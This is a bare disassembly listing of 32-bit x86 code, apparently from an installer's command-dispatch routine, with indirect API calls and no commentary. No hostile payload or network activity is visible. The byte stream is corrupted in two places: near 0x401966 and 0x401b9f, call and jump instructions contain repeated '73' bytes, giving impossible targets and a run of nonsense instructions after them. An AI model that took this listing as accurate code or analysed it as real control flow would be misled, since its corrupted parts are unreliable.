  4016d3:	3b c6                	cmp    %esi,%eax
  4016d5:	76 25                	jbe    0x4016fc
  4016d7:	38 18                	cmp    %bl,(%eax)
  4016d9:	74 21                	je     0x4016fc
  4016db:	56                   	push   %esi
  4016dc:	e8 86 4a 00 00       	call   0x406167
  4016e1:	3b c3                	cmp    %ebx,%eax
  4016e3:	74 0e                	je     0x4016f3
  4016e5:	83 c0 2c             	add    $0x2c,%eax
  4016e8:	50                   	push   %eax
  4016e9:	ff 75 08             	push   0x8(%ebp)
  4016ec:	e8 72 47 00 00       	call   0x405e63
  4016f1:	eb 09                	jmp    0x4016fc
  4016f3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4016fa:	88 1f                	mov    %bl,(%edi)
  4016fc:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4016ff:	0f 85 ca 11 00 00    	jne    0x4028cf
  401705:	68 00 04 00 00       	push   $0x400
  40170a:	57                   	push   %edi
  40170b:	57                   	push   %edi
  40170c:	ff 15 04 71 40 00    	call   *0x407104
  401712:	e9 b8 11 00 00       	jmp    0x4028cf
  401717:	6a ff                	push   $0xffffffff
  401719:	e8 1c 13 00 00       	call   0x402a3a
  40171e:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401721:	51                   	push   %ecx
  401722:	56                   	push   %esi
  401723:	68 00 04 00 00       	push   $0x400
  401728:	53                   	push   %ebx
  401729:	50                   	push   %eax
  40172a:	53                   	push   %ebx
  40172b:	ff 15 08 71 40 00    	call   *0x407108
  401731:	85 c0                	test   %eax,%eax
  401733:	0f 85 96 11 00 00    	jne    0x4028cf
  401739:	e9 3c 0f 00 00       	jmp    0x40267a
  40173e:	6a ef                	push   $0xffffffef
  401740:	e8 f5 12 00 00       	call   0x402a3a
  401745:	50                   	push   %eax
  401746:	56                   	push   %esi
  401747:	e8 b9 43 00 00       	call   0x405b05
  40174c:	e9 55 fe ff ff       	jmp    0x4015a6
  401751:	6a 31                	push   $0x31
  401753:	e8 e2 12 00 00       	call   0x402a3a
  401758:	8b f0                	mov    %eax,%esi
  40175a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40175d:	83 e0 07             	and    $0x7,%eax
  401760:	56                   	push   %esi
  401761:	89 75 f8             	mov    %esi,-0x8(%ebp)
  401764:	89 45 08             	mov    %eax,0x8(%ebp)
  401767:	e8 d6 41 00 00       	call   0x405942
  40176c:	56                   	push   %esi
  40176d:	be 00 94 40 00       	mov    $0x409400,%esi
  401772:	85 c0                	test   %eax,%eax
  401774:	74 08                	je     0x40177e
  401776:	56                   	push   %esi
  401777:	e8 e7 46 00 00       	call   0x405e63
  40177c:	eb 17                	jmp    0x401795
  40177e:	68 00 98 42 00       	push   $0x429800
  401783:	56                   	push   %esi
  401784:	e8 da 46 00 00       	call   0x405e63
  401789:	50                   	push   %eax
  40178a:	e8 46 41 00 00       	call   0x4058d5
  40178f:	50                   	push   %eax
  401790:	e8 ea 46 00 00       	call   0x405e7f
  401795:	56                   	push   %esi
  401796:	e8 33 49 00 00       	call   0x4060ce
  40179b:	bf 00 9c 40 00       	mov    $0x409c00,%edi
  4017a0:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017a4:	7c 31                	jl     0x4017d7
  4017a6:	56                   	push   %esi
  4017a7:	e8 bb 49 00 00       	call   0x406167
  4017ac:	33 c9                	xor    %ecx,%ecx
  4017ae:	3b c3                	cmp    %ebx,%eax
  4017b0:	74 10                	je     0x4017c2
  4017b2:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4017b5:	83 c0 14             	add    $0x14,%eax
  4017b8:	51                   	push   %ecx
  4017b9:	50                   	push   %eax
  4017ba:	ff 15 00 71 40 00    	call   *0x407100
  4017c0:	8b c8                	mov    %eax,%ecx
  4017c2:	8b 45 08             	mov    0x8(%ebp),%eax
  4017c5:	83 c0 fd             	add    $0xfffffffd,%eax
  4017c8:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017cd:	23 c1                	and    %ecx,%eax
  4017cf:	f7 d8                	neg    %eax
  4017d1:	1b c0                	sbb    %eax,%eax
  4017d3:	40                   	inc    %eax
  4017d4:	89 45 08             	mov    %eax,0x8(%ebp)
  4017d7:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017da:	75 06                	jne    0x4017e2
  4017dc:	56                   	push   %esi
  4017dd:	e8 cf 42 00 00       	call   0x405ab1
  4017e2:	33 c0                	xor    %eax,%eax
  4017e4:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  4017e8:	0f 95 c0             	setne  %al
  4017eb:	40                   	inc    %eax
  4017ec:	50                   	push   %eax
  4017ed:	68 00 00 00 40       	push   $0x40000000
  4017f2:	56                   	push   %esi
  4017f3:	e8 de 42 00 00       	call   0x405ad6
  4017f8:	83 f8 ff             	cmp    $0xffffffff,%eax
  4017fb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4017fe:	75 76                	jne    0x401876
  401800:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401803:	75 53                	jne    0x401858
  401805:	68 00 40 42 00       	push   $0x424000
  40180a:	57                   	push   %edi
  40180b:	e8 53 46 00 00       	call   0x405e63
  401810:	56                   	push   %esi
  401811:	68 00 40 42 00       	push   $0x424000
  401816:	e8 48 46 00 00       	call   0x405e63
  40181b:	ff 75 ec             	push   -0x14(%ebp)
  40181e:	68 00 98 40 00       	push   $0x409800
  401823:	e8 5d 46 00 00       	call   0x405e85
  401828:	57                   	push   %edi
  401829:	68 00 40 42 00       	push   $0x424000
  40182e:	e8 30 46 00 00       	call   0x405e63
  401833:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401836:	c1 f8 03             	sar    $0x3,%eax
  401839:	50                   	push   %eax
  40183a:	68 00 98 40 00       	push   $0x409800
  40183f:	e8 15 3e 00 00       	call   0x405659
  401844:	83 e8 04             	sub    $0x4,%eax
  401847:	0f 84 53 ff ff ff    	je     0x4017a0
  40184d:	48                   	dec    %eax
  40184e:	74 1b                	je     0x40186b
  401850:	56                   	push   %esi
  401851:	6a fa                	push   $0xfffffffa
  401853:	e9 3a fc ff ff       	jmp    0x401492
  401858:	ff 75 f8             	push   -0x8(%ebp)
  40185b:	6a e2                	push   $0xffffffe2
  40185d:	e8 1a 38 00 00       	call   0x40507c
  401862:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  401866:	e9 3d fd ff ff       	jmp    0x4015a8
  40186b:	ff 05 a8 37 42 00    	incl   0x4237a8
  401871:	e9 62 10 00 00       	jmp    0x4028d8
  401876:	ff 75 f8             	push   -0x8(%ebp)
  401879:	6a ea                	push   $0xffffffea
  40187b:	e8 fc 37 00 00       	call   0x40507c
  401880:	ff 05 d4 37 42 00    	incl   0x4237d4
  401886:	53                   	push   %ebx
  401887:	53                   	push   %ebx
  401888:	ff 75 f4             	push   -0xc(%ebp)
  40188b:	ff 75 e0             	push   -0x20(%ebp)
  40188e:	e8 c9 16 00 00       	call   0x402f5c
  401893:	ff 0d d4 37 42 00    	decl   0x4237d4
  401899:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
  40189d:	8b f8                	mov    %eax,%edi
  40189f:	75 06                	jne    0x4018a7
  4018a1:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  4018a5:	74 12                	je     0x4018b9
  4018a7:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4018aa:	50                   	push   %eax
  4018ab:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4018ae:	53                   	push   %ebx
  4018af:	50                   	push   %eax
  4018b0:	ff 75 f4             	push   -0xc(%ebp)
  4018b3:	ff 15 10 71 40 00    	call   *0x407110
  4018b9:	ff 75 f4             	push   -0xc(%ebp)
  4018bc:	ff 15 f4 70 40 00    	call   *0x4070f4
  4018c2:	3b fb                	cmp    %ebx,%edi
  4018c4:	0f 8d 05 10 00 00    	jge    0x4028cf
  4018ca:	83 ff fe             	cmp    $0xfffffffe,%edi
  4018cd:	75 13                	jne    0x4018e2
  4018cf:	6a e9                	push   $0xffffffe9
  4018d1:	56                   	push   %esi
  4018d2:	e8 ae 45 00 00       	call   0x405e85
  4018d7:	ff 75 f8             	push   -0x8(%ebp)
  4018da:	56                   	push   %esi
  4018db:	e8 9f 45 00 00       	call   0x405e7f
  4018e0:	eb 08                	jmp    0x4018ea
  4018e2:	6a ee                	push   $0xffffffee
  4018e4:	56                   	push   %esi
  4018e5:	e8 9b 45 00 00       	call   0x405e85
  4018ea:	68 10 00 20 00       	push   $0x200010
  4018ef:	56                   	push   %esi
  4018f0:	e9 74 09 00 00       	jmp    0x402269
  4018f5:	53                   	push   %ebx
  4018f6:	eb 34                	jmp    0x40192c
  4018f8:	6a 31                	push   $0x31
  4018fa:	e8 3b 11 00 00       	call   0x402a3a
  4018ff:	ff 75 d8             	push   -0x28(%ebp)
  401902:	50                   	push   %eax
  401903:	e8 51 3d 00 00       	call   0x405659
  401908:	3b c3                	cmp    %ebx,%eax
  40190a:	0f 84 96 0d 00 00    	je     0x4026a6
  401910:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  401913:	0f 84 4a 01 00 00    	je     0x401a63
  401919:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  40191c:	0f 85 ad 0f 00 00    	jne    0x4028cf
  401922:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401925:	e9 b0 0f 00 00       	jmp    0x4028da
  40192a:	6a f0                	push   $0xfffffff0
  40192c:	e8 09 11 00 00       	call   0x402a3a
  401931:	ff 75 dc             	push   -0x24(%ebp)
  401934:	50                   	push   %eax
  401935:	e8 cb 3d 00 00       	call   0x405705
  40193a:	e9 90 0f 00 00       	jmp    0x4028cf
  40193f:	6a 01                	push   $0x1
  401941:	e8 f4 10 00 00       	call   0x402a3a
  401946:	50                   	push   %eax
  401947:	e8 2d 45 00 00       	call   0x405e79
  40194c:	e9 c2 0b 00 00       	jmp    0x402513
  401951:	6a 02                	push   $0x2
  401953:	e8 c5 10 00 00       	call   0x402a1d
  401958:	6a 03                	push   $0x3
  40195a:	89 45 08             	mov    %eax,0x8(%ebp)
  40195d:	e8 bb 10 00 00       	call   0x402a1d
  401962:	6a 01                	push   $0x1
  401964:	8b f8                	mov    %eax,%edi
  401966:	e8 cf 10 73 73       	call   0x73b32a3a
  40196b:	73 73                	jae    0x4019e0
  40196d:	73 73                	jae    0x4019e2
  40196f:	73 00                	jae    0x401971
  401971:	00 39                	add    %bh,(%ecx)
  401973:	5d                   	pop    %ebp
  401974:	e0 89                	loopne 0x4018ff
  401976:	45                   	inc    %ebp
  401977:	d0 88 1e 74 09 39    	rorb   $1,0x3909741e(%eax)
  40197d:	5d                   	pop    %ebp
  40197e:	08 0f                	or     %cl,(%edi)
  401980:	84 51 0f             	test   %dl,0xf(%ecx)
  401983:	00 00                	add    %al,(%eax)
  401985:	50                   	push   %eax
  401986:	e8 f5 44 00 00       	call   0x405e80
  40198b:	3b fb                	cmp    %ebx,%edi
  40198d:	7d 08                	jge    0x401997
  40198f:	03 f8                	add    %eax,%edi
  401991:	0f 88 3f 0f 00 00    	js     0x4028d6
  401997:	3b f8                	cmp    %eax,%edi
  401999:	7e 02                	jle    0x40199d
  40199b:	8b f8                	mov    %eax,%edi
  40199d:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4019a0:	03 c7                	add    %edi,%eax
  4019a2:	50                   	push   %eax
  4019a3:	56                   	push   %esi
  4019a4:	e8 c1 44 00 00       	call   0x405e6a
  4019a9:	8b 7d 08             	mov    0x8(%ebp),%edi
  4019ac:	3b fb                	cmp    %ebx,%edi
  4019ae:	0f 84 22 0f 00 00    	je     0x4028d6
  4019b4:	7d 0f                	jge    0x4019c5
  4019b6:	56                   	push   %esi
  4019b7:	e8 c4 44 00 00       	call   0x405e80
  4019bc:	03 f8                	add    %eax,%edi
  4019be:	79 05                	jns    0x4019c5
  4019c0:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4019c3:	8b fb                	mov    %ebx,%edi
  4019c5:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  4019cb:	0f 8d 05 0f 00 00    	jge    0x4028d6
  4019d1:	88 1c 37             	mov    %bl,(%edi,%esi,1)
  4019d4:	e9 fd 0e 00 00       	jmp    0x4028d6
  4019d9:	6a 20                	push   $0x20
  4019db:	e8 61 10 00 00       	call   0x402a41
  4019e0:	6a 31                	push   $0x31
  4019e2:	8b f0                	mov    %eax,%esi
  4019e4:	e8 58 10 00 00       	call   0x402a41
  4019e9:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4019ec:	50                   	push   %eax
  4019ed:	56                   	push   %esi
  4019ee:	75 12                	jne    0x401a02
  4019f0:	ff 15 0c 71 40 00    	call   *0x40710c
  4019f6:	85 c0                	test   %eax,%eax
  4019f8:	75 70                	jne    0x401a6a
  4019fa:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4019fd:	e9 df 0e 00 00       	jmp    0x4028e1
  401a02:	ff 15 14 71 40 00    	call   *0x407114
  401a08:	eb ec                	jmp    0x4019f6
  401a0a:	33 ff                	xor    %edi,%edi
  401a0c:	47                   	inc    %edi
  401a0d:	57                   	push   %edi
  401a0e:	e8 2e 10 00 00       	call   0x402a41
  401a13:	68 00 04 00 00       	push   $0x400
  401a18:	56                   	push   %esi
  401a19:	50                   	push   %eax
  401a1a:	89 45 08             	mov    %eax,0x8(%ebp)
  401a1d:	ff 15 18 71 40 00    	call   *0x407118
  401a23:	85 c0                	test   %eax,%eax
  401a25:	74 13                	je     0x401a3a
  401a27:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a2a:	74 13                	je     0x401a3f
  401a2c:	56                   	push   %esi
  401a2d:	ff 75 08             	push   0x8(%ebp)
  401a30:	ff 15 14 71 40 00    	call   *0x407114
  401a36:	85 c0                	test   %eax,%eax
  401a38:	75 05                	jne    0x401a3f
  401a3a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a3d:	88 1e                	mov    %bl,(%esi)
  401a3f:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  401a45:	e9 8c 0e 00 00       	jmp    0x4028d6
  401a4a:	53                   	push   %ebx
  401a4b:	e8 d4 0f 00 00       	call   0x402a24
  401a50:	6a 01                	push   $0x1
  401a52:	8b f0                	mov    %eax,%esi
  401a54:	e8 cb 0f 00 00       	call   0x402a24
  401a59:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  401a5c:	75 08                	jne    0x401a66
  401a5e:	3b f0                	cmp    %eax,%esi
  401a60:	7c 08                	jl     0x401a6a
  401a62:	7e 96                	jle    0x4019fa
  401a64:	eb 0e                	jmp    0x401a74
  401a66:	3b f0                	cmp    %eax,%esi
  401a68:	73 08                	jae    0x401a72
  401a6a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401a6d:	e9 6f 0e 00 00       	jmp    0x4028e1
  401a72:	76 86                	jbe    0x4019fa
  401a74:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a77:	e9 65 0e 00 00       	jmp    0x4028e1
  401a7c:	6a 01                	push   $0x1
  401a7e:	e8 a1 0f 00 00       	call   0x402a24
  401a83:	6a 02                	push   $0x2
  401a85:	8b f8                	mov    %eax,%edi
  401a87:	e8 98 0f 00 00       	call   0x402a24
  401a8c:	8b c8                	mov    %eax,%ecx
  401a8e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401a91:	83 f8 0c             	cmp    $0xc,%eax
  401a94:	77 6d                	ja     0x401b03
  401a96:	ff 24 85 e9 29 40 00 	jmp    *0x4029e9(,%eax,4)
  401a9d:	03 f9                	add    %ecx,%edi
  401a9f:	eb 62                	jmp    0x401b03
  401aa1:	2b f9                	sub    %ecx,%edi
  401aa3:	eb 5e                	jmp    0x401b03
  401aa5:	0f af cf             	imul   %edi,%ecx
  401aa8:	8b f9                	mov    %ecx,%edi
  401aaa:	eb 57                	jmp    0x401b03
  401aac:	3b cb                	cmp    %ebx,%ecx
  401aae:	74 42                	je     0x401af2
  401ab0:	8b c7                	mov    %edi,%eax
  401ab2:	99                   	cltd
  401ab3:	f7 f9                	idiv   %ecx
  401ab5:	8b f8                	mov    %eax,%edi
  401ab7:	eb 4a                	jmp    0x401b03
  401ab9:	0b f9                	or     %ecx,%edi
  401abb:	eb 46                	jmp    0x401b03
  401abd:	23 f9                	and    %ecx,%edi
  401abf:	eb 42                	jmp    0x401b03
  401ac1:	33 f9                	xor    %ecx,%edi
  401ac3:	eb 3e                	jmp    0x401b03
  401ac5:	33 c0                	xor    %eax,%eax
  401ac7:	3b fb                	cmp    %ebx,%edi
  401ac9:	0f 94 c0             	sete   %al
  401acc:	eb e7                	jmp    0x401ab5
  401ace:	3b fb                	cmp    %ebx,%edi
  401ad0:	75 0e                	jne    0x401ae0
  401ad2:	eb 08                	jmp    0x401adc
  401ad4:	33 ff                	xor    %edi,%edi
  401ad6:	eb 2b                	jmp    0x401b03
  401ad8:	3b fb                	cmp    %ebx,%edi
  401ada:	74 f8                	je     0x401ad4
  401adc:	3b cb                	cmp    %ebx,%ecx
  401ade:	74 f4                	je     0x401ad4
  401ae0:	33 ff                	xor    %edi,%edi
  401ae2:	47                   	inc    %edi
  401ae3:	eb 1e                	jmp    0x401b03
  401ae5:	3b cb                	cmp    %ebx,%ecx
  401ae7:	74 09                	je     0x401af2
  401ae9:	8b c7                	mov    %edi,%eax
  401aeb:	99                   	cltd
  401aec:	f7 f9                	idiv   %ecx
  401aee:	8b fa                	mov    %edx,%edi
  401af0:	eb 11                	jmp    0x401b03
  401af2:	33 ff                	xor    %edi,%edi
  401af4:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401afb:	eb 06                	jmp    0x401b03
  401afd:	d3 e7                	shl    %cl,%edi
  401aff:	eb 02                	jmp    0x401b03
  401b01:	d3 ff                	sar    %cl,%edi
  401b03:	57                   	push   %edi
  401b04:	e9 5f fa ff ff       	jmp    0x401568
  401b09:	6a 01                	push   $0x1
  401b0b:	e8 31 0f 00 00       	call   0x402a41
  401b10:	6a 02                	push   $0x2
  401b12:	8b f8                	mov    %eax,%edi
  401b14:	e8 0b 0f 00 00       	call   0x402a24
  401b19:	50                   	push   %eax
  401b1a:	57                   	push   %edi
  401b1b:	56                   	push   %esi
  401b1c:	ff 15 74 72 40 00    	call   *0x407274
  401b22:	83 c4 0c             	add    $0xc,%esp
  401b25:	e9 ac 0d 00 00       	jmp    0x4028d6
  401b2a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401b2d:	8b 3d 04 a8 40 00    	mov    0x40a804,%edi
  401b33:	3b c3                	cmp    %ebx,%eax
  401b35:	74 44                	je     0x401b7b
  401b37:	48                   	dec    %eax
  401b38:	3b fb                	cmp    %ebx,%edi
  401b3a:	0f 84 22 07 00 00    	je     0x402262
  401b40:	8b 3f                	mov    (%edi),%edi
  401b42:	3b c3                	cmp    %ebx,%eax
  401b44:	75 f1                	jne    0x401b37
  401b46:	3b fb                	cmp    %ebx,%edi
  401b48:	0f 84 14 07 00 00    	je     0x402262
  401b4e:	83 c7 04             	add    $0x4,%edi
  401b51:	be 00 94 40 00       	mov    $0x409400,%esi
  401b56:	57                   	push   %edi
  401b57:	56                   	push   %esi
  401b58:	e8 0d 43 00 00       	call   0x405e6a
  401b5d:	a1 04 a8 40 00       	mov    0x40a804,%eax
  401b62:	83 c0 04             	add    $0x4,%eax
  401b65:	50                   	push   %eax
  401b66:	57                   	push   %edi
  401b67:	e8 fe 42 00 00       	call   0x405e6a
  401b6c:	a1 04 a8 40 00       	mov    0x40a804,%eax
  401b71:	56                   	push   %esi
  401b72:	83 c0 04             	add    $0x4,%eax
  401b75:	50                   	push   %eax
  401b76:	e9 81 0c 00 00       	jmp    0x4027fc
  401b7b:	3b d3                	cmp    %ebx,%edx
  401b7d:	74 25                	je     0x401ba4
  401b7f:	3b fb                	cmp    %ebx,%edi
  401b81:	0f 84 26 0b 00 00    	je     0x4026ad
  401b87:	8d 47 04             	lea    0x4(%edi),%eax
  401b8a:	50                   	push   %eax
  401b8b:	56                   	push   %esi
  401b8c:	e8 d9 42 00 00       	call   0x405e6a
  401b91:	8b 07                	mov    (%edi),%eax
  401b93:	57                   	push   %edi
  401b94:	a3 04 a8 40 00       	mov    %eax,0x40a804
  401b99:	ff 15 24 71 40 00    	call   *0x407124
  401b9f:	e9 32 73 73 73       	jmp    0x73b38ed6
  401ba4:	0d 00 00 68 04       	or     $0x4680000,%eax
  401ba9:	04 00                	add    $0x0,%al
  401bab:	00 6a 40             	add    %ch,0x40(%edx)
  401bae:	ff 15 60 71 40 00    	call   *0x407160
  401bb4:	ff 75 d8             	push   -0x28(%ebp)
  401bb7:	8b f0                	mov    %eax,%esi
  401bb9:	8d 46 04             	lea    0x4(%esi),%eax
  401bbc:	50                   	push   %eax
  401bbd:	e8 cd 42 00 00       	call   0x405e8f
  401bc2:	a1 04 a8 40 00       	mov    0x40a804,%eax
  401bc7:	89 06                	mov    %eax,(%esi)
  401bc9:	89 35 04 a8 40 00    	mov    %esi,0x40a804
  401bcf:	e9 05 0d 00 00       	jmp    0x4028d9
  401bd4:	6a 03                	push   $0x3
  401bd6:	e8 4c 0e 00 00       	call   0x402a27
  401bdb:	6a 04                	push   $0x4
  401bdd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401be0:	e8 42 0e 00 00       	call   0x402a27
  401be5:	f6 45 ec 01          	testb  $0x1,-0x14(%ebp)
  401be9:	89 45 08             	mov    %eax,0x8(%ebp)
  401bec:	74 0a                	je     0x401bf8
  401bee:	6a 33                	push   $0x33
  401bf0:	e8 4f 0e 00 00       	call   0x402a44
  401bf5:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401bf8:	f6 45 ec 02          	testb  $0x2,-0x14(%ebp)
  401bfc:	74 0a                	je     0x401c08
  401bfe:	6a 44                	push   $0x44
  401c00:	e8 3f 0e 00 00       	call   0x402a44
  401c05:	89 45 08             	mov    %eax,0x8(%ebp)
  401c08:	83 7d d4 21          	cmpl   $0x21,-0x2c(%ebp)
  401c0c:	6a 01                	push   $0x1
  401c0e:	75 44                	jne    0x401c54
  401c10:	e8 12 0e 00 00       	call   0x402a27
  401c15:	6a 02                	push   $0x2
  401c17:	8b f8                	mov    %eax,%edi
  401c19:	e8 09 0e 00 00       	call   0x402a27
  401c1e:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401c21:	c1 f9 02             	sar    $0x2,%ecx
  401c24:	74 1e                	je     0x401c44
  401c26:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401c29:	52                   	push   %edx
  401c2a:	51                   	push   %ecx
  401c2b:	53                   	push   %ebx
  401c2c:	ff 75 08             	push   0x8(%ebp)
  401c2f:	ff 75 f8             	push   -0x8(%ebp)
  401c32:	50                   	push   %eax
  401c33:	57                   	push   %edi
  401c34:	ff 15 58 72 40 00    	call   *0x407258
  401c3a:	f7 d8                	neg    %eax
  401c3c:	1b c0                	sbb    %eax,%eax
  401c3e:	40                   	inc    %eax
  401c3f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c42:	eb 3f                	jmp    0x401c83
  401c44:	ff 75 08             	push   0x8(%ebp)
  401c47:	ff 75 f8             	push   -0x8(%ebp)
  401c4a:	50                   	push   %eax
  401c4b:	57                   	push   %edi
  401c4c:	ff 15 00 72 40 00    	call   *0x407200
  401c52:	eb 2c                	jmp    0x401c80
  401c54:	e8 eb 0d 00 00       	call   0x402a44
  401c59:	6a 12                	push   $0x12
  401c5b:	8b f8                	mov    %eax,%edi
  401c5d:	e8 e2 0d 00 00       	call   0x402a44
  401c62:	8a 08                	mov    (%eax),%cl
  401c64:	f6 d9                	neg    %cl
  401c66:	1b c9                	sbb    %ecx,%ecx
  401c68:	23 c8                	and    %eax,%ecx
  401c6a:	8a 07                	mov    (%edi),%al
  401c6c:	f6 d8                	neg    %al
  401c6e:	1b c0                	sbb    %eax,%eax
  401c70:	51                   	push   %ecx
  401c71:	23 c7                	and    %edi,%eax
  401c73:	50                   	push   %eax
  401c74:	ff 75 08             	push   0x8(%ebp)
  401c77:	ff 75 f8             	push   -0x8(%ebp)
  401c7a:	ff 15 5c 72 40 00    	call   *0x40725c
  401c80:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401c83:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401c86:	0f 8c 4d 0c 00 00    	jl     0x4028d9
  401c8c:	ff 75 f4             	push   -0xc(%ebp)
  401c8f:	e9 d7 f8 ff ff       	jmp    0x40156b
  401c94:	53                   	push   %ebx
  401c95:	e8 8d 0d 00 00       	call   0x402a27
  401c9a:	50                   	push   %eax
  401c9b:	ff 15 54 72 40 00    	call   *0x407254
  401ca1:	85 c0                	test   %eax,%eax
  401ca3:	0f 84 54 fd ff ff    	je     0x4019fd
  401ca9:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401cac:	e9 33 0c 00 00       	jmp    0x4028e4
  401cb1:	6a 02                	push   $0x2
  401cb3:	e8 6f 0d 00 00       	call   0x402a27
  401cb8:	50                   	push   %eax
  401cb9:	6a 01                	push   $0x1
  401cbb:	e8 67 0d 00 00       	call   0x402a27
  401cc0:	50                   	push   %eax
  401cc1:	ff 15 44 72 40 00    	call   *0x407244
  401cc7:	e9 51 08 00 00       	jmp    0x40251d
  401ccc:	a1 68 37 42 00       	mov    0x423768,%eax
  401cd1:	03 c2                	add    %edx,%eax
  401cd3:	50                   	push   %eax
  401cd4:	6a eb                	push   $0xffffffeb
  401cd6:	53                   	push   %ebx
  401cd7:	e8 4b 0d 00 00       	call   0x402a27
  401cdc:	50                   	push   %eax
  401cdd:	ff 15 48 72 40 00    	call   *0x407248
  401ce3:	e9 f1 0b 00 00       	jmp    0x4028d9
  401ce8:	52                   	push   %edx
  401ce9:	ff 75 f8             	push   -0x8(%ebp)
  401cec:	ff 15 44 72 40 00    	call   *0x407244
  401cf2:	8b f0                	mov    %eax,%esi
  401cf4:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401cf7:	50                   	push   %eax
  401cf8:	56                   	push   %esi
  401cf9:	ff 15 0c 72 40 00    	call   *0x40720c
  401cff:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  401d02:	6a 10                	push   $0x10
  401d04:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  401d08:	50                   	push   %eax
  401d09:	8b 45 b0             	mov    -0x50(%ebp),%eax
  401d0c:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  401d10:	50                   	push   %eax
  401d11:	53                   	push   %ebx
  401d12:	53                   	push   %ebx
  401d13:	e8 2c 0d 00 00       	call   0x402a44
  401d18:	50                   	push   %eax
  401d19:	53                   	push   %ebx
  401d1a:	ff 15 50 72 40 00    	call   *0x407250
  401d20:	50                   	push   %eax
  401d21:	53                   	push   %ebx
  401d22:	68 72 01 00 00       	push   $0x172
  401d27:	56                   	push   %esi
  401d28:	ff 15 00 72 40 00    	call   *0x407200
  401d2e:	3b c3                	cmp    %ebx,%eax
  401d30:	0f 84 a3 0b 00 00    	je     0x4028d9
  401d36:	50                   	push   %eax
  401d37:	ff 15 5c 70 40 00    	call   *0x40705c
  401d3d:	e9 97 0b 00 00       	jmp    0x4028d9
  401d42:	ff 75 f8             	push   -0x8(%ebp)
  401d45:	ff 15 38 72 40 00    	call   *0x407238
  401d4b:	8b f8                	mov    %eax,%edi
  401d4d:	6a 48                	push   $0x48
  401d4f:	6a 5a                	push   $0x5a
  401d51:	57                   	push   %edi
  401d52:	ff 15 60 70 40 00    	call   *0x407060
  401d58:	50                   	push   %eax
  401d59:	6a 02                	push   $0x2
  401d5b:	e8 c7 0c 00 00       	call   0x402a27
  401d60:	50                   	push   %eax
  401d61:	ff 15 48 71 40 00    	call   *0x407148
  401d67:	57                   	push   %edi
  401d68:	ff 75 f8             	push   -0x8(%ebp)
  401d6b:	f7 d8                	neg    %eax
  401d6d:	a3 08 a8 40 00       	mov    %eax,0x40a808
  401d72:	ff 15 f4 71 40 00    	call   *0x4071f4
  401d78:	6a 03                	push   $0x3
  401d7a:	e8 a8 0c 00 00       	call   0x402a27
  401d7f:	a3 18 a8 40 00       	mov    %eax,0x40a818
  401d84:	8a 45 e8             	mov    -0x18(%ebp),%al
  401d87:	ff 75 dc             	push   -0x24(%ebp)
  401d8a:	8a c8                	mov    %al,%cl
  401d8c:	80 e1 01             	and    $0x1,%cl
  401d8f:	c6 05 1f a8 40 00 01 	movb   $0x1,0x40a81f
  401d96:	88 0d 1c a8 40 00    	mov    %cl,0x40a81c
  401d9c:	8a c8                	mov    %al,%cl
  401d9e:	80 e1 02             	and    $0x2,%cl
  401da1:	24 04                	and    $0x4,%al
  401da3:	68 24 a8 40 00       	push   $0x40a824
  401da8:	88 0d 1d a8 40 00    	mov    %cl,0x40a81d
  401dae:	a2 1e a8 40 00       	mov    %al,0x40a81e
  401db3:	e8 d7 40 00 00       	call   0x405e8f
  401db8:	68 08 a8 40 00       	push   $0x40a808
  401dbd:	ff 15 54 70 40 00    	call   *0x407054
  401dc3:	e9 55 07 00 00       	jmp    0x40251d
  401dc8:	53                   	push   %ebx
  401dc9:	e8 59 0c 00 00       	call   0x402a27
  401dce:	6a 01                	push   $0x1
  401dd0:	8b f0                	mov    %eax,%esi
  401dd2:	e8 50 0c 00 00       	call   0x402a27
  401dd7:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401dda:	50                   	push   %eax
  401ddb:	56                   	push   %esi
  401ddc:	75 0b                	jne    0x401de9
  401dde:	ff 15 78 72 40 00    	call   *0x407278
  401de4:	e9 f0 0a 00 00       	jmp    0x4028d9
  401de9:	ff 15 f8 71 40 00    	call   *0x4071f8
  401def:	e9 e5 0a 00 00       	jmp    0x4028d9
